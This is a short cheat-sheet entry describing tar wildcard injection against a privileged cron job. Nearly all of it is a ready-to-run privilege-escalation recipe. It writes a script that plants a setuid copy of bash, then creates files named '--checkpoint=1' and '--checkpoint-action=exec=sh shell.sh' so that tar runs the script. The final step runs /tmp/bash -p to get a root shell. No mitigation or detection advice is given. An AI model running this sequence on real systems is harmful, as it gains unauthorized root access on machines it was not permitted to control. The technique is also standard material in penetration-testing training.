# Tar Wildcard Injection

If a privileged cron job runs `tar` with a wildcard (`*`) inside a directory you can write to, drop filenames that `tar` parses as flags instead of file paths — `--checkpoint-action=exec=...` runs an arbitrary command.

```bash
cd <world-writable-dir-the-cron-tars>
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
# wait for the cron to fire, then:
/tmp/bash -p
```

